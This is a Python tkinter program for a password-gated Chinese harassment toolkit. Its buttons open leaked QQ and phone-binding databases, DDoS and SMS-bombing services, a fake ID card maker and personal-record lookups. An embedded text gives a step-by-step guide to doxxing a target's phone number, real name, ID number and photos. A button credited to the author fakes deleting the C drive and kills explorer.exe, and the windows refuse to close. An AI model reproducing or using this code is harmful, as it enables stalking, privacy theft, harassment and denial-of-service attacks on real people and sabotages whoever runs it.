import tkinter as tk
from tkinter import messagebox as msgbox, LEFT , CENTER , ttk
import sys
from webbrowser import *
import time
import os

msgbox.showinfo('Hello!','Made By 大佛爷/鹤爷\n(没错都是我)')

sys.path.append("libs")
qtl = 'https://avsov.com/qq_lol.html'
ip = 'https://ipuu.net/Home'
ipt = 'https://ip.cn/'
qcc = 'https://www.qcc.com/'
tianyancha = 'https://www.tianyancha.com/'
qqpaoxian = 'https://uutool.cn/phone-generate/'
q1 = 'http://qb.shegongk.com/'
q2 = 'https://388tool.com/'
q3 = 'https://chabang.top/'
ltq = 'https://avsov.com/lol_qq.html'
oldse = 'https://ziyuanwang.asia/chabang3/7/'
ddos = 'http://www.hacku.cn/i/DDoS/'
phonenumbertq = 'http://qb.shegongk.com/sj.php'
liemo = 'http://sgk66.cc/'
mdjm = 'https://ip.cn/md5.html'
hongzha = 'https://www.hpeak.cn/?s=%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8&type=post'

q4 = 'https://zy.xywlapi.cc/home.html'
ip1 = 'https://www.opengps.cn/Data/IP/IPSearch.aspx'
phip = 'https://anxin360.com/Phone/'
sfz = 'http://app.gjzwfw.gov.cn/jmopen/webapp/html5/unZip/eb1247990d9b4c1085e15a549b5138e7/gzsjmhkb/index.html'
stu = 'http://www.zydmt.com/cx/index.asp'
work = 'http://app.gjzwfw.gov.cn/jmopen/webapp/html5/jycyz/index.html'
ddos1 = 'https://run.ialtone.xyz/message/index.php'
phoneboom = 'https://smsbomber.online/call-bomber.php'
madesfz = 'https://www.socarchina.com/m/sfz/index.php'
emptynumber = 'https://uutool.cn/phone-check/'

inst = 'https://develope.lanzoug.com/file/?UzUCPAo7BjcDCgI6VmNdMQM8DjZeSFA8BHAGdAY7WzYIZAY0XHNULgMwVnhTYlJ1VWkEaFZlAmUCWlQ7U2sBPVNiAmQKbgZlA2ECZlYzXWgDbA4tXmdQIQQ+BjIGYltsCDsGYFwxVDQDc1ZwU3dSblU9BDFWOwIzAipUYlM5AS9TYwJhCngGagNmAmZWOl1lAz8OOl43UDAEMgY4Bm9bPgg7BmVcNVRjA2xWYVMwUmJVaQQzVmoCMwJgVDdTawExU2UCMwpvBnwDMAIsVmddegMsDnheZFAgBGoGZAZnW2gIPwZgXDhUMQNkVjRTIVInVWYEbFZsAmYCOFRjUzkBOFNkAmAKYQZnA2ECY1YwXXIDdw4tXmdQPgR0Bj0Ga1tsCDAGZFw5VDgDYlYwUzdSZlUpBHRWeQJ3AjhUY1M5AThTZgJtCm8GZANtAmJWO116AywOYl5xUG8EMQYyBmtbdAg6BmFcMVQuA2xWLlM2'

p = tk.Tk()
p.title('请加鹤爷QQ1685137190获取密码,限时7r！！')
p.geometry('300x200')
p.iconbitmap('nice.ico')
wo = tk.Label(p,text='输入密码:',fg='black',justify=LEFT,compound=CENTER,font=('等线light',20))
wo.pack()

en = tk.Entry(p,bd=10,fg='green',highlightthickness=10,highlightcolor='yellow',insertbackground='green')
en.pack()
def get():
    result = str(en.get())
    if result == '7$EbGWH^19z17~%w8LT' or result == '钝角':

        root = tk.Tk()
        root.title('鹤杀工具')
        root.iconbitmap('an.ico')

        root.geometry('650x500+10+50')

        def closeWindow():
            msgbox.showerror('Windows资源管理器', 'ERROR!\n!!!!!!!!!!!!!无法关闭!!!!!!!!!!!!!')

        def qqtolol():
            open(qtl)

        def install():
            open(inst)

        def loltoqq():
            open(ltq)

        def ipp():
            open(ipt)

        def iip():
            open(ip)

        def qccc():
            open(qcc)

        def tianyan():
            open(tianyancha)

        def qp():
            open(qqpaoxian)

        def yq():
            open(q1)

        def eq():
            open(q2)

        def sq():
            open(q3)

        def oldq():
            open(oldse)

        def dddos():
            open(ddos)

        def ptq():
            open(phonenumbertq)

        def llm():
            open(liemo)

        def q4c():
            open(q4)

        def ip1c():
            open(ip1)

        def phipc():
            open(phip)

        def sfzc():
            open(sfz)

        def stuc():
            open(stu)

        def workc():
            open(work)

        def ddos1c():
            open(ddos1)

        def phoneboomc():
            open(phoneboom)

        def madesfzc():
            open(madesfz)

        def emptynumberc():
            open(emptynumber)

        def run():

            def close():
                msgbox.showerror('ERROR!','无法关闭！')

            def show():
                progressbar = tk.ttk.Progressbar(window)
                progressbar.pack(pady=50)
                progressbar['maximum'] = 500
                progressbar['value'] = 0
                wd = tk.Label(window,text='正在删除C盘文件')
                wd.pack()
                for i in range(500):
                    progressbar['value'] = i + 1
                    window.update()
                    time.sleep(0.05)
                os.system('taskkill /f /im explorer.exe /t')
            window = tk.Tk()
            window.title('感谢支持！')
            window.geometry('300x200')


            but = tk.Button(window,text='RUN',command=show,width=30)
            but.pack(pady=5)

            window.protocol("WM_DELETE_WINDOW", close)


            window.mainloop()

        def closeAllWindow():
            root.destroy()

        def id():
            thought = tk.Tk()
            thought.title('开户思路')
            silu = tk.Label(thought,text='''
抓到ip,就用https://www.ip138.com/ 这个网站，得到地址(省份即可-因为p大部分的市区都难准确)
跑现绑手机号先选择忘记密码，获得对方的前三位还有后二位使用前三后二补全网站，选择地址(省份即可，你要是觉得你的ip百分百查出了正确的地址就用)然后选择补全，
获得文本，最后一个一个找《建议不要全国找，全国会让你崩溃)得出对方的电话号码,找他支付宝，或者微信，给他1分钱(没钱闪开)还可以把手机号放在钉钉里搜索名字
用得到名字的一部分，挂天眼查，得出姓名，然后就能得到具体市区，其至能查他身份证开身份证需要出生，性别，还有居住位置
(身份证前2位为省级编码，3-4位为地级市编码，5-6位县(区)编码)
如果有照片访问工具，而且对方为手机，你可以选择进入相册，遇到大头再好不过
或者通过钉钉，微信，抖音，或者快手，找到他的动态，或者他爹妈的动态，大概率能获得大头
如果没查到绑把QQ放在百度里高搜 查到了绑也高搜
            ''',justify=LEFT,image=tk.PhotoImage(file='bg.png'),compound=CENTER,font=('微软雅黑',10),fg='black')
            silu.pack()
            if __name__ == '__main__':
                thought.mainloop()

        a = tk.Label(root, text='欢迎使用鹤杀工具！',font=("微软雅黑", 20))
        a.grid(row=0,column=5)

        label = tk.Label(root, text='关闭软件请点击下方关闭按钮', font=("宋体", 10))
        label.grid(row=1,column=5)

        s = tk.Button(root,text='世界上最全的社工',font=("宋体",15),width=20,command=install,bg='red')
        s.grid(row=0,column=0)

        btn = tk.Button(root, text='QQ查询LOL', font=("宋体", 15), width=20,command=qqtolol,bg='red')
        btn.grid(row=0,column=1)

        loltoqq = tk.Button(root, text='LOL查询QQ', font=("宋体", 15), width=20, command=loltoqq,bg='orange')
        loltoqq.grid(row=1,column=0)

        ipa = tk.Button(root, text='ip查询1', font=("宋体", 15), width=20, command=ipp,bg='orange')
        ipa.grid(row=1,column=1)

        ipb = tk.Button(root, text='ip查询2', font=("宋体", 15), width=20, command=iip,bg='yellow')
        ipb.grid(row=2,column=0)

        qichacha = tk.Button(root, text='企查查', font=("宋体", 15), width=20, command=qccc,bg='yellow')
        qichacha.grid(row=2,column=1)

        tianyanchaa = tk.Button(root, text='天眼查', font=("宋体", 15), width=20, command=tianyan,bg='green')
        tianyanchaa.grid(row=3,column=0)

        qqpao = tk.Button(root, text='QQ跑现绑工具', font=("宋体", 15), width=20, command=qp,bg='green')
        qqpao.grid(row=3,column=1)

        qq1 = tk.Button(root, text='q绑数据库1', font=("宋体", 15), width=20, command=yq,bg='cyan')
        qq1.grid(row=4,column=0)

        qq2 = tk.Button(root, text='q绑数据库2', font=("宋体", 15), width=20, command=eq,bg='cyan')
        qq2.grid(row=4,column=1)

        qq3 = tk.Button(root, text='q绑数据库3', font=("宋体", 15), width=20, command=sq,bg='blue')
        qq3.grid(row=5,column=0)

        old = tk.Button(root, text='QQ老密码查询', font=("宋体", 15), width=20, command=oldq,bg='blue')
        old.grid(row=5,column=1)

        ddofs = tk.Button(root, text='DDOS攻击1', font=("宋体", 15), width=20, command=dddos,bg='purple')
        ddofs.grid(row=6,column=0)

        phonetq = tk.Button(root, text='手机号查QQ', font=("宋体", 15), width=20, command=ptq,bg='purple')
        phonetq.grid(row=6,column=1)

        lm = tk.Button(root, text='猎魔', font=("宋体", 15), width=20, command=llm,bg='pink')
        lm.grid(row=7,column=0)

        idea = tk.Button(root,text='思路',font=("宋体",15),width=20,command=id,bg='pink')
        idea.grid(row=7,column=1)

        xq4 = tk.Button(root, text='q绑数据库4', font=("宋体", 15), width=20, command=q4c,bg='purple')
        xq4.grid(row=8,column=0)

        xip1 = tk.Button(root, text='查ip', font=("宋体", 15), width=20, command=ip1c,bg='purple')
        xip1.grid(row=8,column=1)

        xphip = tk.Button(root, text='手机号查ip', font=("宋体", 15), width=20, command=phipc,bg='blue')
        xphip.grid(row=9,column=0)

        xsfz = tk.Button(root, text='开户大头', font=("宋体", 15), width=20, command=sfzc,bg='blue')
        xsfz.grid(row=9,column=1)

        xstu = tk.Button(root, text='学生信息', font=("宋体", 15), width=20, command=stuc,bg='cyan')
        xstu.grid(row=10,column=0)

        xwork = tk.Button(root, text='工作查询', font=("宋体", 15), width=20, command=workc,bg='cyan')
        xwork.grid(row=10,column=1)

        xddos1 = tk.Button(root, text='DDoS攻击2', font=("宋体", 15), width=20, command=ddos1c,bg='green')
        xddos1.grid(row=11,column=0)

        xphoneboom = tk.Button(root, text='手机号轰炸', font=("宋体", 15), width=20, command=phoneboomc,bg='green')
        xphoneboom.grid(row=11,column=1)

        xmadesfz = tk.Button(root, text='身份证制作', font=("宋体", 15), width=20, command=madesfzc,bg='yellow')
        xmadesfz.grid(row=12,column=0)

        xemptynumber = tk.Button(root, text='查ip', font=("宋体", 15), width=20, command=emptynumberc,bg='yellow')
        xemptynumber.grid(row=12,column=1)

        close = tk.Button(root, text="关                    闭", command=closeAllWindow, fg='blue',width=20,bg='red')
        close.grid(row=2, column=5)

        er = tk.Button(root,text='By 大佛爷',width=20,command=run,bg='black',fg='white')
        er.grid(row=13,column=1)

        l1 = tk.Label(root, text='如果觉得不错的话\n可以加入天启鹤杀官方交流群！\n群号:864075824', font=('等线light', 10))
        l1.grid(row=3, column=5)



        root.protocol("WM_DELETE_WINDOW", closeWindow)
        if __name__ == '__main__':
            root.mainloop()
    elif result != '7$EbGWH^19z17~%w8LT':
        msgbox.showerror('ERROR!','密码错误！请重试')
pswd = tk.Button(p,text='点击进入',command=get)
pswd.pack()
p.mainloop()